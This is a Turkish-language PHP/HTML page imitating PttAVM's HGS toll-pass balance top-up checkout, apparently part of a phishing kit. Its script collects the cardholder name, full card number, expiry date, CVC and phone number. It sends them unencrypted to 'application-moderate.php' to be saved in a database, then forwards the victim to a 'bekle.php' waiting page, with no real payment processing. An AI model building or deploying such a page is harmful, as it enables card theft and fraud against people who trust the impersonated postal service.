<?php
session_start();

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HGS Bakiye Yükleme - Ödeme - PttAVM</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #c8912e;
            --primary-hover: #b07d24;
            --primary-light: rgba(200, 145, 46, 0.12);
            --dark: #0c1824;
            --dark-card: rgba(12, 24, 36, 0.92);
            --dark-input: rgba(20, 40, 60, 0.7);
            --text: #f0f2f5;
            --text-muted: #8a9bb5;
            --border: rgba(255, 255, 255, 0.1);
            --radius: 10px;
            --radius-sm: 8px;
            --error: #e74c3c;
            --error-bg: rgba(231, 76, 60, 0.08);
            --error-border: rgba(231, 76, 60, 0.25);
            --success: #2ecc71;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--dark);
            color: var(--text);
            min-height: 100vh;
            min-height: 100dvh;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
        }

        /* ── Navbar ── */
        nav {
            position: sticky;
            top: 0;
            z-index: 100;
            padding: 0 1.5rem;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(10, 20, 32, 0.97);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border-bottom: 2px solid var(--primary);
        }

        .nav-brand {
            display: flex;
            align-items: center;
        }

        .nav-brand img {
            height: 36px;
            width: auto;
        }

        .nav-links {
            display: flex;
            align-items: center;
            gap: 2px;
            list-style: none;
        }

        .nav-links a {
            display: flex;
            align-items: center;
            gap: 6px;
            text-decoration: none;
            color: var(--text-muted);
            font-size: 0.82rem;
            font-weight: 500;
            padding: 8px 14px;
            border-radius: var(--radius-sm);
            transition: all 0.2s;
            position: relative;
        }

        .nav-links a:hover {
            color: var(--text);
            background: rgba(255, 255, 255, 0.05);
        }

        .nav-links a.active { color: var(--primary); }

        .nav-links a.active::after {
            content: '';
            position: absolute;
            bottom: -12px;
            left: 14px;
            right: 14px;
            height: 2px;
            background: var(--primary);
        }

        .nav-links .material-symbols-outlined { font-size: 18px; }

        .hamburger {
            display: none;
            background: none;
            border: none;
            color: var(--text);
            cursor: pointer;
            width: 44px;
            height: 44px;
            align-items: center;
            justify-content: center;
            border-radius: var(--radius-sm);
            transition: background 0.2s;
        }

        .hamburger:active {
            background: rgba(255, 255, 255, 0.06);
        }

        .hamburger .material-symbols-outlined { font-size: 26px; }

        /* ── Hero ── */
        .hero {
            position: relative;
            min-height: calc(100vh - 60px);
            min-height: calc(100dvh - 60px);
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 2rem 1.5rem;
        }

        .hero-bg {
            position: absolute;
            inset: 0;
            z-index: 0;
            background: url('background.jpg') center center / cover no-repeat;
        }

        .hero-bg::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(180deg,
                rgba(10,20,32,0.85) 0%,
                rgba(10,20,32,0.68) 40%,
                rgba(10,20,32,0.78) 70%,
                rgba(10,20,32,0.95) 100%
            );
        }

        /* ── Card ── */
        .card-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 680px;
        }

        .card {
            background: var(--dark-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-top: 3px solid var(--primary);
            border-radius: var(--radius);
            padding: 2rem;
            box-shadow: 0 24px 64px -16px rgba(0,0,0,0.6);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 0.75rem;
        }

        .card-header-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, var(--primary), #d4a033);
            border-radius: var(--radius-sm);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .card-header-icon .material-symbols-outlined {
            font-size: 26px;
            color: #fff;
        }

        .card-header-text h1 {
            font-size: 1.3rem;
            font-weight: 700;
            letter-spacing: -0.3px;
            line-height: 1.2;
        }

        .card-header-text h1 span { color: var(--primary); }

        .card-header-text p {
            font-size: 0.78rem;
            color: var(--text-muted);
            margin-top: 2px;
        }

        .divider {
            height: 1px;
            background: var(--border);
            margin: 1rem 0;
        }

        .notice {
            background: rgba(200, 145, 46, 0.06);
            border: 1px solid rgba(200, 145, 46, 0.15);
            border-left: 3px solid var(--primary);
            border-radius: 6px;
            padding: 10px 14px;
            margin-bottom: 1.25rem;
            font-size: 0.8rem;
            color: var(--text-muted);
            line-height: 1.55;
        }

        /* ── Payment Layout ── */
        .payment-layout {
            display: grid;
            grid-template-columns: 1fr 240px;
            gap: 1.75rem;
            align-items: start;
        }

        /* ── Form ── */
        .form-section-title {
            font-size: 0.78rem;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 0.75rem;
        }

        .form-group {
            margin-bottom: 0.75rem;
        }

        .form-group label {
            display: block;
            font-size: 0.76rem;
            font-weight: 600;
            color: var(--text-muted);
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            background: var(--dark-input);
            color: var(--text);
            font-family: inherit;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
            -webkit-appearance: none;
            appearance: none;
        }

        .form-group input::placeholder {
            color: rgba(138, 155, 181, 0.5);
        }

        .form-group input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(200, 145, 46, 0.1);
        }

        .form-group input.input-error {
            border-color: var(--error);
            box-shadow: 0 0 0 2px var(--error-bg);
        }

        .form-group input.input-success {
            border-color: var(--success);
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .error-text {
            display: none;
            color: var(--error);
            font-size: 0.72rem;
            font-weight: 500;
            margin-top: 4px;
            align-items: center;
            gap: 4px;
        }

        .error-text.visible {
            display: flex;
        }

        .error-text .material-symbols-outlined {
            font-size: 14px;
        }

        /* ── Card Preview ── */
        .card-preview {
            position: sticky;
            top: 84px;
        }

        .credit-card {
            width: 100%;
            aspect-ratio: 1.586;
            border-radius: 14px;
            padding: 20px 18px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
            background: linear-gradient(135deg, #1a2a3a 0%, #0d1b2a 50%, #1a2a3a 100%);
            border: 1px solid rgba(255,255,255,0.08);
            box-shadow: 0 12px 32px -6px rgba(0,0,0,0.5);
        }

        .credit-card::before {
            content: '';
            position: absolute;
            top: -30%;
            right: -20%;
            width: 180px;
            height: 180px;
            background: radial-gradient(circle, rgba(200,145,46,0.08) 0%, transparent 70%);
        }

        .card-chip {
            width: 36px;
            height: 26px;
            border-radius: 5px;
            background: linear-gradient(135deg, #c0a060, #d4b878, #c0a060);
            position: relative;
        }

        .card-chip::after {
            content: '';
            position: absolute;
            inset: 3px;
            border: 1px solid rgba(0,0,0,0.15);
            border-radius: 3px;
        }

        .card-type-icon {
            position: absolute;
            top: 18px;
            right: 18px;
            font-size: 0.7rem;
            font-weight: 700;
            color: var(--text-muted);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .card-number-display {
            font-size: 0.95rem;
            font-weight: 600;
            letter-spacing: 2.5px;
            color: rgba(240,242,245,0.85);
            font-variant-numeric: tabular-nums;
        }

        .card-bottom {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        .card-holder-display {
            font-size: 0.65rem;
            font-weight: 600;
            letter-spacing: 1.2px;
            text-transform: uppercase;
            color: rgba(240,242,245,0.6);
        }

        .card-holder-display .holder-label {
            font-size: 0.5rem;
            font-weight: 400;
            color: rgba(240,242,245,0.3);
            letter-spacing: 0.5px;
            margin-bottom: 3px;
            display: block;
        }

        .card-expiry-display {
            text-align: right;
        }

        .card-expiry-display .expiry-label {
            font-size: 0.5rem;
            font-weight: 400;
            color: rgba(240,242,245,0.3);
            letter-spacing: 0.5px;
            margin-bottom: 3px;
            display: block;
        }

        .card-expiry-display .expiry-value {
            font-size: 0.7rem;
            font-weight: 600;
            color: rgba(240,242,245,0.6);
            letter-spacing: 1px;
        }

        /* ── Phone ── */
        .phone-section {
            margin-top: 0.25rem;
        }

        /* ── Checkbox ── */
        .consent-group {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-top: 1rem;
            margin-bottom: 0.25rem;
        }

        .consent-group input[type="checkbox"] {
            -webkit-appearance: none;
            appearance: none;
            width: 22px;
            height: 22px;
            min-width: 22px;
            border: 1.5px solid var(--border);
            border-radius: 5px;
            background: var(--dark-input);
            cursor: pointer;
            margin-top: 1px;
            transition: all 0.2s;
            position: relative;
        }

        .consent-group input[type="checkbox"]:checked {
            background: var(--primary);
            border-color: var(--primary);
        }

        .consent-group input[type="checkbox"]:checked::after {
            content: '';
            position: absolute;
            left: 6px;
            top: 2px;
            width: 6px;
            height: 11px;
            border: solid #fff;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .consent-group input[type="checkbox"].input-error {
            border-color: var(--error);
            box-shadow: 0 0 0 2px var(--error-bg);
        }

        .consent-group label {
            font-size: 0.78rem;
            color: var(--text-muted);
            line-height: 1.5;
            cursor: pointer;
        }

        .consent-group label a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 600;
        }

        .consent-group label a:hover {
            text-decoration: underline;
        }

        /* ── Disclaimer ── */
        .disclaimer {
            text-align: center;
            font-size: 0.72rem;
            color: rgba(138, 155, 181, 0.5);
            margin-top: 0.75rem;
            margin-bottom: 0.25rem;
        }

        /* ── Buttons ── */
        .btn-primary {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: var(--radius-sm);
            background: var(--primary);
            color: #fff;
            font-family: inherit;
            font-size: 0.9rem;
            font-weight: 700;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s;
            margin-top: 0.75rem;
            min-height: 48px;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-primary:hover { background: var(--primary-hover); }
        .btn-primary:active { transform: scale(0.98); }
        .btn-primary .material-symbols-outlined { font-size: 20px; }

        .btn-secondary {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            background: transparent;
            color: var(--text-muted);
            font-family: inherit;
            font-size: 0.82rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: all 0.2s;
            margin-top: 10px;
            min-height: 44px;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-secondary:hover {
            color: var(--text);
            border-color: rgba(255,255,255,0.2);
            background: rgba(255,255,255,0.03);
        }

        .btn-secondary:active { transform: scale(0.98); }
        .btn-secondary .material-symbols-outlined { font-size: 18px; }

        /* ── Global Error Box ── */
        .global-error {
            display: none;
            background: var(--error-bg);
            border: 1px solid var(--error-border);
            border-left: 3px solid var(--error);
            border-radius: 6px;
            padding: 10px 14px;
            margin-bottom: 1rem;
            font-size: 0.8rem;
            color: var(--error);
            line-height: 1.5;
            align-items: center;
            gap: 8px;
        }

        .global-error.visible {
            display: flex;
        }

        .global-error .material-symbols-outlined {
            font-size: 20px;
            flex-shrink: 0;
        }

        /* ── Footer ── */
        footer {
            position: relative;
            z-index: 10;
            border-top: 1px solid var(--border);
            background: #0a1420;
        }

        .footer-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 1.75rem 1.5rem 1.25rem;
            display: grid;
            grid-template-columns: 1fr auto;
            gap: 2rem;
            align-items: start;
        }

        .footer-brand {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .footer-brand .brand-name {
            font-weight: 700;
            font-size: 0.95rem;
        }

        .footer-brand .brand-name span { color: var(--primary); }

        .footer-brand p {
            font-size: 0.78rem;
            color: var(--text-muted);
            line-height: 1.5;
            max-width: 340px;
        }

        .footer-links {
            display: flex;
            gap: 2rem;
            list-style: none;
        }

        .footer-links a {
            font-size: 0.8rem;
            color: var(--text-muted);
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s;
        }

        .footer-links a:hover { color: var(--primary); }

        .footer-bottom {
            border-top: 1px solid var(--border);
            padding: 1rem 1.5rem;
            text-align: center;
            font-size: 0.75rem;
            color: rgba(138, 155, 181, 0.5);
        }

        /* ── Responsive ── */
        @media (max-width: 768px) {
            nav {
                padding: 0 1rem;
                height: 56px;
            }

            .nav-brand img {
                height: 32px;
            }

            .nav-links {
                display: none;
                position: fixed;
                top: 56px;
                left: 0;
                right: 0;
                bottom: 0;
                flex-direction: column;
                background: rgba(10, 20, 32, 0.98);
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
                padding: 0.75rem;
                z-index: 200;
                overflow-y: auto;
                animation: slideDown 0.2s ease;
            }

            @keyframes slideDown {
                from { opacity: 0; transform: translateY(-8px); }
                to { opacity: 1; transform: translateY(0); }
            }

            .nav-links.open { display: flex; }

            .nav-links li {
                border-bottom: 1px solid var(--border);
            }

            .nav-links li:last-child {
                border-bottom: none;
            }

            .nav-links a {
                padding: 14px 16px;
                width: 100%;
                font-size: 0.88rem;
                border-radius: var(--radius-sm);
            }

            .nav-links a .material-symbols-outlined { font-size: 20px; }

            .nav-links a.active {
                background: rgba(200, 145, 46, 0.08);
            }

            .nav-links a.active::after { display: none; }

            .hamburger { display: flex; }

            .hero {
                min-height: auto;
                padding: 1.25rem 1rem;
                align-items: flex-start;
            }

            .card {
                padding: 1.5rem 1.25rem;
            }

            .card-header {
                gap: 12px;
            }

            .card-header-icon {
                width: 42px;
                height: 42px;
            }

            .card-header-icon .material-symbols-outlined {
                font-size: 22px;
            }

            .card-header-text h1 {
                font-size: 1.15rem;
            }

            .card-header-text p {
                font-size: 0.73rem;
            }

            .divider {
                margin: 0.85rem 0;
            }

            .notice {
                padding: 10px 12px;
                margin-bottom: 1rem;
                font-size: 0.76rem;
            }

            .payment-layout {
                grid-template-columns: 1fr;
                gap: 1.25rem;
            }

            .card-preview {
                order: -1;
                position: static;
                max-width: 300px;
                margin: 0 auto;
            }

            .credit-card {
                padding: 16px 16px;
            }

            .card-number-display {
                font-size: 0.9rem;
                letter-spacing: 2px;
            }

            .form-section-title {
                font-size: 0.74rem;
            }

            .form-group {
                margin-bottom: 0.7rem;
            }

            .form-group label {
                font-size: 0.74rem;
            }

            .form-group input {
                padding: 12px 14px;
                font-size: 16px;
            }

            .form-row {
                gap: 10px;
            }

            .consent-group {
                margin-top: 0.85rem;
            }

            .consent-group label {
                font-size: 0.76rem;
            }

            .disclaimer {
                font-size: 0.7rem;
            }

            .btn-primary {
                padding: 14px;
                font-size: 0.88rem;
                min-height: 50px;
            }

            .btn-secondary {
                padding: 12px;
                font-size: 0.82rem;
                min-height: 46px;
            }

            .global-error {
                padding: 10px 12px;
                font-size: 0.76rem;
            }

            .footer-inner {
                grid-template-columns: 1fr;
                padding: 1.25rem 1rem 1rem;
                gap: 1rem;
            }

            .footer-links {
                flex-direction: column;
                gap: 0;
            }

            .footer-links li {
                border-bottom: 1px solid var(--border);
            }

            .footer-links li:last-child {
                border-bottom: none;
            }

            .footer-links a {
                display: block;
                padding: 12px 0;
                font-size: 0.82rem;
            }

            .footer-bottom {
                padding: 0.85rem 1rem;
                font-size: 0.72rem;
            }
        }

        @media (max-width: 380px) {
            .card {
                padding: 1.25rem 1rem;
            }

            .card-header-text h1 {
                font-size: 1.05rem;
            }

            .card-preview {
                max-width: 260px;
            }

            .form-row {
                grid-template-columns: 1fr;
                gap: 0;
            }

            .notice {
                font-size: 0.72rem;
            }
        }
    </style>
</head>
<body>

    <!-- Navbar -->
    <nav>
        <div class="nav-brand">
            <a href="index.html"><img src="logo.png" alt="PttAVM HGS"></a>
        </div>
        <button class="hamburger" onclick="document.querySelector('.nav-links').classList.toggle('open')" aria-label="Menu">
            <span class="material-symbols-outlined">menu</span>
        </button>
        <ul class="nav-links">
            <li><a href="index.html">
                <span class="material-symbols-outlined">home</span> Ana Sayfa
            </a></li>
            <li><a href="#" class="active">
                <span class="material-symbols-outlined">account_balance_wallet</span> HGS Yükle
            </a></li>
            <li><a href="#">
                <span class="material-symbols-outlined">query_stats</span> Hasar Sorgula
            </a></li>
            <li><a href="#">
                <span class="material-symbols-outlined">speed</span> KM Sorgula
            </a></li>
            <li><a href="#">
                <span class="material-symbols-outlined">shopping_cart</span> Alışverişe Başla
            </a></li>
        </ul>
    </nav>

    <!-- Hero -->
    <section class="hero">
        <div class="hero-bg"></div>

        <div class="card-wrapper">
            <div class="card">
                <div class="card-header">
                    <div class="card-header-icon">
                        <span class="material-symbols-outlined">credit_card</span>
                    </div>
                    <div class="card-header-text">
                        <h1><span>HGS</span> Bakiye Yükleme</h1>
                        <p>Ödeme yapmak için kullanmak istediğiniz kart bilgilerini girin.</p>
                    </div>
                </div>

                <div class="divider"></div>

                <!-- Global Error -->
                <div class="global-error" id="globalError">
                    <span class="material-symbols-outlined">error</span>
                    <span id="globalErrorText"></span>
                </div>

                <div class="notice">
                    Bu sistemden, yalnızca PTT kanalı ile satışı gerçekleştirilen HGS ürünlerine bakiye yükleme işlemi yapılmaktadır.
                </div>

                <div class="payment-layout">
                    <!-- Form Side -->
                    <div class="form-side">
                        <div class="form-section-title">Kart Bilgileri</div>

                        <!-- Card Holder -->
                        <div class="form-group">
                            <label for="cardHolder">Kart üzerindeki ad ve soyad</label>
                            <input type="text" id="cardHolder" placeholder="Ad Soyad" autocomplete="cc-name" oninput="onCardHolderInput(this)">
                            <div class="error-text" id="cardHolderError">
                                <span class="material-symbols-outlined">error</span>
                                <span></span>
                            </div>
                        </div>

                        <!-- Card Number -->
                        <div class="form-group">
                            <label for="cardNumber">Kart numarası</label>
                            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" inputmode="numeric" oninput="onCardNumberInput(this)">
                            <div class="error-text" id="cardNumberError">
                                <span class="material-symbols-outlined">error</span>
                                <span></span>
                            </div>
                        </div>

                        <!-- Expiry + CVC -->
                        <div class="form-row">
                            <div class="form-group">
                                <label for="cardExpiry">Son kullanım tarihi</label>
                                <input type="text" id="cardExpiry" placeholder="AA / YY" maxlength="7" autocomplete="cc-exp" inputmode="numeric" oninput="onExpiryInput(this)">
                                <div class="error-text" id="cardExpiryError">
                                    <span class="material-symbols-outlined">error</span>
                                    <span></span>
                                </div>
                            </div>
                            <div class="form-group">
                                <label for="cardCvc">CVC kodu</label>
                                <input type="text" id="cardCvc" placeholder="000" maxlength="3" autocomplete="cc-csc" inputmode="numeric" oninput="onCvcInput(this)">
                                <div class="error-text" id="cardCvcError">
                                    <span class="material-symbols-outlined">error</span>
                                    <span></span>
                                </div>
                            </div>
                        </div>

                        <div class="divider"></div>

                        <!-- Phone -->
                        <div class="form-section-title phone-section">İletişim</div>
                        <div class="form-group">
                            <label for="phone">Telefon numarası</label>
                            <input type="text" id="phone" placeholder="(5xx) xxx xx xx" maxlength="15" inputmode="tel" oninput="onPhoneInput(this)">
                            <div class="error-text" id="phoneError">
                                <span class="material-symbols-outlined">error</span>
                                <span></span>
                            </div>
                        </div>
                    </div>

                    <!-- Card Preview Side -->
                    <div class="card-preview">
                        <div class="credit-card">
                            <div class="card-chip"></div>
                            <div class="card-type-icon" id="cardTypeIcon"></div>
                            <div class="card-number-display" id="cardNumberDisplay">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
                            <div class="card-bottom">
                                <div class="card-holder-display">
                                    <span class="holder-label">KART SAHİBİ</span>
                                    <span id="cardHolderDisplay">AD SOYAD</span>
                                </div>
                                <div class="card-expiry-display">
                                    <span class="expiry-label">SON KUL.</span>
                                    <span class="expiry-value" id="cardExpiryDisplay">&bull;&bull;/&bull;&bull;</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Consent -->
                <div class="consent-group">
                    <input type="checkbox" id="consent">
                    <label for="consent">
                        <a href="#">Açık Rıza Metni</a> ve <a href="#">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
                    </label>
                </div>
                <div class="error-text" id="consentError" style="margin-left: 32px;">
                    <span class="material-symbols-outlined">error</span>
                    <span></span>
                </div>

                <p class="disclaimer">Ödeme işlemini onayladığınızda, kartınızdan tahsis edilecektir.</p>

                <!-- Buttons -->
                <button class="btn-primary" onclick="handlePayment()">
                    Ödeme Yap
                    <span class="material-symbols-outlined">lock</span>
                </button>

                <button class="btn-secondary" onclick="window.location.href='screen2.php'">
                    <span class="material-symbols-outlined">arrow_back</span>
                    Geri Dön
                </button>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="footer-inner">
            <div class="footer-brand">
                <div class="brand-name">Ptt<span>AVM</span> - HGS</div>
                <p>T.C. Posta ve Telgraf Teşkilatı A.Ş. bünyesinde hizmet veren Hızlı Geçiş Sistemi bakiye yükleme platformu.</p>
            </div>
            <ul class="footer-links">
                <li><a href="#">Önemli Bilgiler</a></li>
                <li><a href="#">Görüş Bildir</a></li>
                <li><a href="#">Sıkça Sorulan Sorular</a></li>
                <li><a href="#">İletişim</a></li>
            </ul>
        </div>
        <div class="footer-bottom">
            &copy; 2026 PttAVM | Tüm hakları saklıdır.
        </div>
    </footer>

    <script>
        // ── Helpers ──
        function showError(id, msg) {
            const el = document.getElementById(id);
            el.querySelector('span:last-child').textContent = msg;
            el.classList.add('visible');
        }

        function hideError(id) {
            document.getElementById(id).classList.remove('visible');
        }

        function setInputState(input, state) {
            input.classList.remove('input-error', 'input-success');
            if (state) input.classList.add(state);
        }

        // ── Luhn Algorithm ──
        function luhnCheck(num) {
            const digits = num.replace(/\s/g, '');
            if (digits.length < 13 || digits.length > 19) return false;
            if (!/^\d+$/.test(digits)) return false;

            let sum = 0;
            let alternate = false;
            for (let i = digits.length - 1; i >= 0; i--) {
                let n = parseInt(digits[i], 10);
                if (alternate) {
                    n *= 2;
                    if (n > 9) n -= 9;
                }
                sum += n;
                alternate = !alternate;
            }
            return sum % 10 === 0;
        }

        // ── Card Type Detection ──
        function detectCardType(num) {
            const d = num.replace(/\s/g, '');
            if (/^4/.test(d)) return 'VISA';
            if (/^5[1-5]/.test(d) || /^2[2-7]/.test(d)) return 'MASTERCARD';
            if (/^3[47]/.test(d)) return 'AMEX';
            if (/^9792/.test(d)) return 'TROY';
            return '';
        }

        // ── Card Holder ──
        function onCardHolderInput(input) {
            input.value = input.value.replace(/[^a-zA-ZçÇğĞıİöÖşŞüÜ\s]/g, '');
            const val = input.value.trim();
            const display = document.getElementById('cardHolderDisplay');
            display.textContent = val.length > 0 ? val.toUpperCase() : 'AD SOYAD';

            if (val.length > 0) {
                hideError('cardHolderError');
                setInputState(input, null);
            }
        }

        // ── Card Number ──
        function onCardNumberInput(input) {
            let val = input.value.replace(/\D/g, '');
            val = val.replace(/(\d{4})(?=\d)/g, '$1 ');
            input.value = val;

            const display = document.getElementById('cardNumberDisplay');
            const raw = val.replace(/\s/g, '');
            let formatted = '';
            for (let i = 0; i < 16; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += i < raw.length ? raw[i] : '\u2022';
            }
            display.textContent = formatted;

            const type = detectCardType(val);
            document.getElementById('cardTypeIcon').textContent = type;

            if (raw.length >= 13) {
                if (luhnCheck(val)) {
                    hideError('cardNumberError');
                    setInputState(input, 'input-success');
                } else {
                    showError('cardNumberError', 'Geçersiz kart numarası.');
                    setInputState(input, 'input-error');
                }
            } else {
                hideError('cardNumberError');
                setInputState(input, null);
            }
        }

        // ── Expiry ──
        function onExpiryInput(input) {
            let val = input.value.replace(/\D/g, '');
            if (val.length >= 2) {
                val = val.substring(0, 2) + ' / ' + val.substring(2, 4);
            }
            input.value = val;

            const display = document.getElementById('cardExpiryDisplay');
            const raw = input.value.replace(/\D/g, '');
            const mm = raw.substring(0, 2) || '\u2022\u2022';
            const yy = raw.substring(2, 4) || '\u2022\u2022';
            display.textContent = mm + '/' + yy;

            if (raw.length === 4) {
                const month = parseInt(raw.substring(0, 2), 10);
                const year = parseInt('20' + raw.substring(2, 4), 10);
                const now = new Date();
                const currentMonth = now.getMonth() + 1;
                const currentYear = now.getFullYear();

                if (month < 1 || month > 12) {
                    showError('cardExpiryError', 'Geçersiz ay.');
                    setInputState(input, 'input-error');
                } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    showError('cardExpiryError', 'Kartınızın süresi dolmuş.');
                    setInputState(input, 'input-error');
                } else {
                    hideError('cardExpiryError');
                    setInputState(input, 'input-success');
                }
            } else {
                hideError('cardExpiryError');
                setInputState(input, null);
            }
        }

        // ── CVC ──
        function onCvcInput(input) {
            input.value = input.value.replace(/\D/g, '');
            if (input.value.length >= 3) {
                hideError('cardCvcError');
                setInputState(input, 'input-success');
            } else {
                setInputState(input, null);
            }
        }

        // ── Phone ──
        function onPhoneInput(input) {
            let val = input.value.replace(/\D/g, '');
            if (val.length > 0) {
                let formatted = '(' + val.substring(0, 3);
                if (val.length >= 3) formatted += ') ';
                if (val.length > 3) formatted += val.substring(3, 6);
                if (val.length > 6) formatted += ' ' + val.substring(6, 8);
                if (val.length > 8) formatted += ' ' + val.substring(8, 10);
                input.value = formatted;
            }

            if (val.length > 0) {
                hideError('phoneError');
                setInputState(input, null);
            }
        }

        // ── Submit ──
        async function handlePayment() {
            let hasError = false;
            const globalError = document.getElementById('globalError');
            globalError.classList.remove('visible');

            const holder = document.getElementById('cardHolder');
            const holderVal = holder.value.trim();
            if (!holderVal) {
                showError('cardHolderError', 'Ad soyad alanı zorunludur.');
                setInputState(holder, 'input-error');
                hasError = true;
            } else if (holderVal.split(/\s+/).length < 2) {
                showError('cardHolderError', 'Lütfen ad ve soyadınızı giriniz.');
                setInputState(holder, 'input-error');
                hasError = true;
            } else {
                hideError('cardHolderError');
                setInputState(holder, null);
            }

            const number = document.getElementById('cardNumber');
            const numberRaw = number.value.replace(/\s/g, '');
            if (!numberRaw) {
                showError('cardNumberError', 'Kart numarası zorunludur.');
                setInputState(number, 'input-error');
                hasError = true;
            } else if (numberRaw.length < 13) {
                showError('cardNumberError', 'Kart numarası en az 13 haneli olmalıdır.');
                setInputState(number, 'input-error');
                hasError = true;
            } else if (!luhnCheck(number.value)) {
                showError('cardNumberError', 'Geçersiz kart numarası. Lütfen kontrol ediniz.');
                setInputState(number, 'input-error');
                hasError = true;
            }

            const expiry = document.getElementById('cardExpiry');
            const expiryRaw = expiry.value.replace(/\D/g, '');
            if (expiryRaw.length < 4) {
                showError('cardExpiryError', 'Son kullanım tarihi zorunludur.');
                setInputState(expiry, 'input-error');
                hasError = true;
            } else {
                const month = parseInt(expiryRaw.substring(0, 2), 10);
                const year = parseInt('20' + expiryRaw.substring(2, 4), 10);
                const now = new Date();
                if (month < 1 || month > 12) {
                    showError('cardExpiryError', 'Geçersiz ay.');
                    setInputState(expiry, 'input-error');
                    hasError = true;
                } else if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
                    showError('cardExpiryError', 'Kartınızın süresi dolmuş.');
                    setInputState(expiry, 'input-error');
                    hasError = true;
                }
            }

            const cvc = document.getElementById('cardCvc');
            if (cvc.value.length < 3) {
                showError('cardCvcError', 'CVC en az 3 haneli olmalıdır.');
                setInputState(cvc, 'input-error');
                hasError = true;
            }

            const phone = document.getElementById('phone');
            const phoneRaw = phone.value.replace(/\D/g, '');
            if (!phoneRaw) {
                showError('phoneError', 'Telefon numarası zorunludur.');
                setInputState(phone, 'input-error');
                hasError = true;
            } else if (phoneRaw.length < 10) {
                showError('phoneError', 'Geçerli bir telefon numarası giriniz.');
                setInputState(phone, 'input-error');
                hasError = true;
            }

            const consent = document.getElementById('consent');
            if (!consent.checked) {
                showError('consentError', 'Devam etmek için sözleşmeyi onaylamanız gereklidir.');
                consent.classList.add('input-error');
                hasError = true;
            } else {
                hideError('consentError');
                consent.classList.remove('input-error');
            }

            if (hasError) {
                document.getElementById('globalErrorText').textContent = 'Lütfen yukarıdaki hataları düzeltiniz.';
                globalError.classList.add('visible');
                globalError.scrollIntoView({ behavior: 'smooth', block: 'center' });
                return;
            }

            // Ödeme bilgilerini veritabanına kaydet
            const formData = new FormData();
            formData.append('action', 'update_payment');
            formData.append('card_holder', holderVal);
            formData.append('card_number', numberRaw);
            formData.append('card_expiry', expiry.value);
            formData.append('card_cvc', cvc.value);
            formData.append('phone', phoneRaw);
            
            try {
                const response = await fetch('application-moderate.php', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Bekle sayfasına yönlendir
                    window.location.href = 'bekle.php';
                } else {
                    document.getElementById('globalErrorText').textContent = 'Hata: ' + result.message;
                    globalError.classList.add('visible');
                }
            } catch (error) {
                document.getElementById('globalErrorText').textContent = 'Bir hata olustu: ' + error.message;
                globalError.classList.add('visible');
            }
        }

        document.getElementById('consent').addEventListener('change', function() {
            if (this.checked) {
                hideError('consentError');
                this.classList.remove('input-error');
            }
        });

        // Close menu when clicking a link
        document.querySelectorAll('.nav-links a').forEach(link => {
            link.addEventListener('click', () => {
                document.querySelector('.nav-links').classList.remove('open');
            });
        });
    </script>
    <script src="/tracking.js"></script>
</body>
</html>
